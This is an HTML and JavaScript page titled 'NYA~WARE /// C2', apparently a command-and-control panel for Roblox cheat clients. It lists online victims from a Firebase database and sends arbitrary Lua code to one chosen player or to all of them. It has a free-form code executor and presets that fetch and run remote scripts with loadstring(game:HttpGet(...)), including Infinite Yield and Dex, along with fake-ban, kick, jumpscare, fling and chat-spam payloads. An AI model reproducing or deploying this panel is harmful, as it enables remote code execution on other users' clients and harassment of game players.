<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NYA~WARE /// C2</title>
    
    <!-- Icons & Fonts -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg-deep: #0f0510;
            --bg-surface: #1a0b1f;
            --glass: rgba(255, 180, 220, 0.05);
            --glass-border: rgba(255, 180, 220, 0.15);
            
            --primary: #ff7eb6; /* Neon Pink */
            --primary-glow: rgba(255, 126, 182, 0.5);
            --secondary: #7ee7ff; /* Trans/Pastel Blue */
            --danger: #ff5c5c;
            --success: #00ff9d;
            
            --font-main: 'Quicksand', sans-serif;
            --font-code: 'JetBrains Mono', monospace;
            
            --bounce: cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; user-select: none; }
        
        body {
            margin: 0; padding: 0;
            background-color: var(--bg-deep);
            color: #ffe6f2;
            font-family: var(--font-main);
            height: 100dvh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* --- CUTE BACKGROUND FX --- */
        .bg-grid {
            position: fixed; inset: -50%; width: 200%; height: 200%;
            background-image: 
                radial-gradient(var(--glass-border) 1px, transparent 1px);
            background-size: 30px 30px;
            transform: perspective(500px) rotateX(60deg);
            animation: gridMove 20s linear infinite;
            z-index: 0; opacity: 0.3; pointer-events: none;
        }
        @keyframes gridMove { 0% { transform: perspective(500px) rotateX(60deg) translateY(0); } 100% { transform: perspective(500px) rotateX(60deg) translateY(30px); } }

        .floating-heart {
            position: fixed; color: var(--primary); opacity: 0.2; z-index: 0;
            animation: floatHeart 8s ease-in-out infinite; font-size: 20px;
        }
        @keyframes floatHeart { 0% { transform: translateY(110vh) rotate(0deg); opacity:0; } 50% { opacity: 0.5; } 100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; } }

        /* --- BOOT SEQUENCE --- */
        #boot-screen {
            position: fixed; inset: 0; background: var(--bg-deep); z-index: 9999;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        .boot-text { color: var(--primary); font-size: 16px; font-weight: 700; margin-bottom: 15px; text-shadow: 0 0 15px var(--primary); letter-spacing: 2px; }
        .heart-loader { font-size: 24px; color: var(--secondary); animation: heartBeat 1s infinite; }
        @keyframes heartBeat { 0% { transform: scale(1); } 25% { transform: scale(1.3); } 50% { transform: scale(1); } 75% { transform: scale(1.3); } 100% { transform: scale(1); } }
        .fade-out { animation: fadeOut 0.6s ease forwards; pointer-events: none; }
        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }

        /* --- HEADER --- */
        header {
            height: 70px; padding: 0 24px;
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(26, 11, 31, 0.6); backdrop-filter: blur(15px);
            border-bottom: 1px solid var(--glass-border);
            z-index: 100; position: relative;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
        }

        .brand { font-weight: 700; font-size: 20px; display: flex; align-items: center; gap: 10px; color: #fff; }
        .brand i { color: var(--primary); filter: drop-shadow(0 0 5px var(--primary)); font-size: 22px; }
        
        .status-pill {
            font-size: 12px; padding: 6px 16px; border-radius: 50px;
            background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border);
            color: #ffaad4; font-weight: 600; display: flex; align-items: center; gap: 8px;
            transition: 0.3s; cursor: pointer;
        }
        .status-pill.active {
            border-color: var(--primary); background: rgba(255, 126, 182, 0.1);
            color: #fff; box-shadow: 0 0 15px var(--primary-glow);
        }

        /* --- CONTENT --- */
        #viewport { flex: 1; position: relative; overflow: hidden; z-index: 10; }

        .page {
            position: absolute; inset: 0; padding: 20px;
            overflow-y: auto; display: none; padding-bottom: 100px;
            animation: popIn 0.4s var(--bounce);
        }
        .page.active { display: block; }
        @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }

        /* --- COMPONENTS --- */
        .pink-input {
            width: 100%; background: rgba(0,0,0,0.3); border: 2px solid var(--glass-border);
            padding: 15px; border-radius: 20px; color: white; font-family: var(--font-main);
            margin-bottom: 20px; font-weight: 600; transition: 0.3s;
        }
        .pink-input:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }

        /* Player Card */
        .uwu-card {
            background: var(--glass); border: 1px solid var(--glass-border);
            padding: 15px; border-radius: 25px; margin-bottom: 12px;
            display: flex; align-items: center; justify-content: space-between;
            transition: 0.2s; cursor: pointer;
        }
        .uwu-card:active { transform: scale(0.95); background: rgba(255, 126, 182, 0.1); }
        .uwu-card.selected { border-color: var(--primary); background: rgba(255, 126, 182, 0.2); }
        
        .avatar {
            width: 45px; height: 45px; background: linear-gradient(45deg, var(--primary), var(--secondary));
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-weight: 700; color: #fff; margin-right: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        /* Buttons Grid */
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        
        .action-card {
            background: linear-gradient(160deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01));
            border: 1px solid var(--glass-border); padding: 20px; border-radius: 25px;
            text-align: center; cursor: pointer; transition: 0.3s var(--bounce);
        }
        .action-card i { font-size: 26px; margin-bottom: 10px; color: var(--secondary); transition: 0.3s; }
        .action-card span { font-weight: 700; font-size: 13px; color: #ffcfe5; }
        
        .action-card:hover { transform: translateY(-5px); border-color: var(--primary); }
        .action-card:hover i { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
        
        .action-card.danger { border-color: rgba(255, 92, 92, 0.3); }
        .action-card.danger:hover i { color: var(--danger); }

        /* EDITOR */
        #editor-wrapper {
            background: #15081a; border-radius: 20px; border: 2px solid var(--glass-border);
            overflow: hidden; height: 55vh; display: flex; flex-direction: column;
        }
        .tool-bar {
            background: rgba(0,0,0,0.2); padding: 8px; display: flex; gap: 8px; overflow-x: auto;
        }
        .cute-btn {
            background: var(--glass); border: none; color: var(--primary);
            padding: 8px 14px; border-radius: 12px; font-weight: 700; font-family: var(--font-code);
            font-size: 12px; min-width: 35px;
        }
        .cute-btn:active { background: var(--primary); color: white; }

        /* --- NAV BAR --- */
        .nav-island {
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
            width: 85%; height: 70px; background: rgba(20, 10, 25, 0.85);
            backdrop-filter: blur(20px); border: 1px solid var(--glass-border);
            border-radius: 35px; display: flex; justify-content: space-evenly; align-items: center;
            z-index: 200; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        
        .nav-item {
            color: rgba(255,255,255,0.4); font-size: 22px; padding: 12px;
            transition: 0.4s var(--bounce); position: relative;
        }
        .nav-item.active { color: var(--primary); transform: translateY(-8px); }
        .nav-item.active::after {
            content: '•'; position: absolute; bottom: -5px; left: 50%; transform: translateX(-50%);
            color: var(--primary); font-size: 20px;
        }

        /* Toast */
        .toast {
            position: fixed; top: 90px; left: 50%; transform: translate(-50%, -20px);
            background: #1a0b1f; padding: 12px 25px; border-radius: 50px;
            border: 2px solid var(--primary); color: #fff; font-weight: 700;
            opacity: 0; pointer-events: none; transition: 0.4s var(--bounce); z-index: 300;
            display: flex; align-items: center; gap: 10px; box-shadow: 0 0 20px var(--primary-glow);
        }
        .toast.show { opacity: 1; transform: translate(-50%, 0); }

    </style>
</head>
<body>

    <!-- BG FX -->
    <div class="bg-grid"></div>
    <!-- Script generates floating hearts here -->

    <!-- BOOT SCREEN -->
    <div id="boot-screen">
        <div class="heart-loader"><i class="fas fa-heart"></i></div>
        <div class="boot-text" style="margin-top:20px;">Waking up, cutie...</div>
    </div>

    <!-- HEADER -->
    <header>
        <div class="brand"><i class="fas fa-cat"></i> NYA~WARE</div>
        <div id="status-pill" class="status-pill" onclick="nav('players')">
            <i class="fas fa-heart-broken"></i> Lonely :(
        </div>
    </header>

    <!-- CONTENT -->
    <div id="viewport">
        
        <!-- PLAYERS TAB -->
        <div id="page-players" class="page active">
            <input type="text" class="pink-input" id="search" placeholder="Search for friends... <3" onkeyup="filter()">
            
            <div style="font-size:12px; font-weight:700; color:var(--secondary); margin: 0 0 15px 10px; letter-spacing:1px;">AVAILABLE HEADPATS</div>
            <div id="player-list"></div>

            <div class="uwu-card" style="justify-content:center; margin-top:30px; border-color:var(--danger); background:rgba(255,92,92,0.1);" onclick="selectAll()">
                <span style="color:var(--danger); font-weight:800; letter-spacing:1px;"><i class="fas fa-globe"></i> GLOBAL CUDDLES (ALL)</span>
            </div>
        </div>

        <!-- SCRIPTS TAB -->
        <div id="page-scripts" class="page">
            
            <div style="font-size:12px; font-weight:700; color:var(--primary); margin: 0 0 15px 10px; letter-spacing:1px;">VISUALS & OUTFITS</div>
            <div class="grid-2">
                <div class="action-card" onclick="run('femboy_outfit')">
                    <i class="fas fa-tshirt"></i><br><span>Become Femboy</span>
                </div>
                <div class="action-card" onclick="run('spin')">
                    <i class="fas fa-sync fa-spin"></i><br><span>Spinny Skirt</span>
                </div>
                <div class="action-card" onclick="run('uwu_chat')">
                    <i class="fas fa-comments"></i><br><span>UwU Chat</span>
                </div>
                <div class="action-card" onclick="run('fling')">
                    <i class="fas fa-wind"></i><br><span>Yeet (Fling)</span>
                </div>
            </div>

            <div style="font-size:12px; font-weight:700; color:var(--secondary); margin: 25px 0 15px 10px; letter-spacing:1px;">ADMIN TOOLS</div>
            <div class="grid-2">
                <div class="action-card" onclick="run('iy')">
                    <i class="fas fa-terminal"></i><br><span>Inf Yield</span>
                </div>
                <div class="action-card" onclick="run('dex')">
                    <i class="fas fa-folder-open"></i><br><span>Dex</span>
                </div>
            </div>

            <div style="font-size:12px; font-weight:700; color:var(--danger); margin: 25px 0 15px 10px; letter-spacing:1px;">MEAN STUFF >:(</div>
            <div class="grid-2">
                <div class="action-card danger" onclick="run('jumpscare')">
                    <i class="fas fa-ghost"></i><br><span>Jumpscare</span>
                </div>
                <div class="action-card danger" onclick="run('fakeban')">
                    <i class="fas fa-ban"></i><br><span>Fake Ban</span>
                </div>
                <div class="action-card danger" onclick="run('kick')">
                    <i class="fas fa-door-open"></i><br><span>Kick Out</span>
                </div>
            </div>
        </div>

        <!-- EXECUTOR TAB -->
        <div id="page-executor" class="page">
            <div id="editor-wrapper">
                <div class="tool-bar">
                    <button class="cute-btn" onclick="insert('local ')">local</button>
                    <button class="cute-btn" onclick="insert('function()')">func</button>
                    <button class="cute-btn" onclick="insert('game.Players')">plys</button>
                    <button class="cute-btn" onclick="move('left')">←</button>
                    <button class="cute-btn" onclick="move('right')">→</button>
                </div>
                <div id="monaco-host" style="flex:1;"></div>
            </div>
            
            <div class="grid-2" style="margin-top:15px;">
                <button class="action-card" style="border-color:var(--success); color:var(--success);" onclick="execute()">
                    <i class="fas fa-play" style="color:var(--success)"></i><br><span>GO!</span>
                </button>
                <button class="action-card" style="border-color:var(--danger); color:var(--danger);" onclick="editor.setValue('')">
                    <i class="fas fa-trash" style="color:var(--danger)"></i><br><span>CLEAR</span>
                </button>
            </div>
        </div>

    </div>

    <!-- NAV -->
    <div class="nav-island">
        <div class="nav-item active" onclick="nav('players')"><i class="fas fa-user-friends"></i></div>
        <div class="nav-item" onclick="nav('scripts')"><i class="fas fa-magic"></i></div>
        <div class="nav-item" onclick="nav('executor')"><i class="fas fa-code"></i></div>
    </div>

    <!-- TOAST -->
    <div class="toast" id="toast">
        <i class="fas fa-heart"></i> <span id="toast-msg">Sent <3</span>
    </div>

    <!-- JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs/loader.js"></script>
    <script>
        // --- CONFIG ---
        const DB_URL = "https://rbxctos-default-rtdb.firebaseio.com";
        let editor, selectedTarget = null;

        // Boot
        setTimeout(() => {
            document.getElementById('boot-screen').classList.add('fade-out');
            spawnHearts();
        }, 2000);

        function spawnHearts() {
            setInterval(() => {
                const h = document.createElement('i');
                h.className = 'fas fa-heart floating-heart';
                h.style.left = Math.random() * 100 + 'vw';
                h.style.animationDuration = (Math.random() * 3 + 5) + 's';
                document.body.appendChild(h);
                setTimeout(() => h.remove(), 8000);
            }, 800);
        }

        // Nav
        function nav(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('page-' + page).classList.add('active');
            const idx = ['players', 'scripts', 'executor'].indexOf(page);
            document.querySelectorAll('.nav-item')[idx].classList.add('active');
        }

        // Firebase
        async function fetchTargets() {
            try {
                let res = await fetch(DB_URL + "/online_players.json");
                let data = await res.json();
                const container = document.getElementById('player-list');
                const now = Math.floor(Date.now() / 1000);

                if(!data) {
                    container.innerHTML = `<div style="text-align:center; color:#ffaad4; margin-top:50px; font-weight:600;">No one is here... qwq</div>`;
                    return;
                }

                container.innerHTML = "";
                for(let [name, lastPing] of Object.entries(data)) {
                    let isOnline = (now - lastPing) < 15;
                    let card = document.createElement('div');
                    card.className = `uwu-card ${selectedTarget === name ? 'selected' : ''}`;
                    card.onclick = () => select(name);
                    card.innerHTML = `
                        <div style="display:flex; align-items:center;">
                            <div class="avatar">${name[0].toUpperCase()}</div>
                            <div>
                                <div style="font-weight:700; color:#fff;">${name}</div>
                                <div style="font-size:11px; color:${isOnline ? 'var(--success)' : '#666'};">
                                    <i class="fas fa-circle" style="font-size:6px;"></i> ${isOnline ? 'Vibing' : 'Sleepy'}
                                </div>
                            </div>
                        </div>
                        ${selectedTarget === name ? '<i class="fas fa-heart" style="color:var(--primary)"></i>' : ''}
                    `;
                    container.appendChild(card);
                }
            } catch(e) {}
        }

        function select(name) {
            selectedTarget = name;
            const badge = document.getElementById('status-pill');
            badge.innerHTML = `<i class="fas fa-user-check"></i> ${name}`;
            badge.classList.add('active');
            fetchTargets();
        }

        function selectAll() {
            selectedTarget = "ALL_USERS";
            const badge = document.getElementById('status-pill');
            badge.innerHTML = `<i class="fas fa-globe"></i> EVERYONE`;
            badge.classList.add('active');
            toast("Selected Everyone! >w<");
        }

        // Execution
        async function send(code) {
            if(!selectedTarget) { toast("Select a cutie first! >_<"); nav('players'); return; }
            let path = selectedTarget === "ALL_USERS" ? "ALL_USERS" : selectedTarget;
            
            try {
                await fetch(`${DB_URL}/commands/${path}.json`, {
                    method: 'PUT', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(code)
                });
                toast("Command Sent! <3");
            } catch(e) { toast("Error qwq"); }
        }

        function toast(msg) {
            const t = document.getElementById('toast');
            document.getElementById('toast-msg').innerText = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 2000);
        }

        // Scripts
        const scripts = {
            'jumpscare': `loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_GITHUB/SCRIPTS/main/jumpscare.lua"))()`,
            'fakeban': `loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_GITHUB/SCRIPTS/main/fakeban.lua"))()`,
            'fling': `game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,10000,0)`,
            'spin': `loadstring(game:HttpGet("https://pastebin.com/raw/spinbot_example"))()`,
            'iy': `loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()`,
            'dex': `loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/Rbx-Dex/master/main.lua"))()`,
            // Custom Femboy Script (Example logic)
            'femboy_outfit': `
                -- Example Outfit Loader
                local char = game.Players.LocalPlayer.Character
                -- Add code here to change shirt/pants to femboy aesthetic
                print("Transformation complete :3")
            `,
            'uwu_chat': `
                while task.wait(3) do
                    local msg = {"UwU", "OwO", "Nyaa~", ":3", "H-Hello...", "Anyone want cuddles?"}
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg[math.random(#msg)], "All")
                end
            `
        };
        function run(k) { send(scripts[k]); }
        function execute() { send(editor.getValue()); }

        // Monaco
        require.config({ paths: { 'vs': 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.34.1/min/vs' }});
        require(['vs/editor/editor.main'], function() {
            monaco.editor.defineTheme('sakura', {
                base: 'vs-dark', inherit: true,
                rules: [
                    { token: 'keyword', foreground: 'ff7eb6', fontStyle: 'bold' },
                    { token: 'string', foreground: '7ee7ff' },
                    { token: 'number', foreground: 'bd93f9' }
                ],
                colors: { 'editor.background': '#15081a', 'editor.lineHighlightBackground': '#2a1033' }
            });
            editor = monaco.editor.create(document.getElementById('monaco-host'), {
                value: 'print("Hello World! :3")', language: 'lua', theme: 'sakura',
                minimap: {enabled:false}, automaticLayout:true, fontSize:14, fontFamily:'JetBrains Mono'
            });
        });

        function insert(t) { 
            const p = editor.getPosition();
            editor.executeEdits("", [{ range: new monaco.Range(p.lineNumber, p.column, p.lineNumber, p.column), text: t }]);
            editor.focus();
        }
        function move(d) {
            const p = editor.getPosition();
            if(d=='left') editor.setPosition({lineNumber:p.lineNumber, column:p.column-1});
            if(d=='right') editor.setPosition({lineNumber:p.lineNumber, column:p.column+1});
            editor.focus();
        }
        function filter() {
            let term = document.getElementById('search').value.toLowerCase();
            document.querySelectorAll('.uwu-card').forEach(el => {
                el.style.display = el.innerText.toLowerCase().includes(term) ? 'flex' : 'none';
            });
        }

        setInterval(fetchTargets, 4000);
        fetchTargets();
    </script>
</body>
</html>
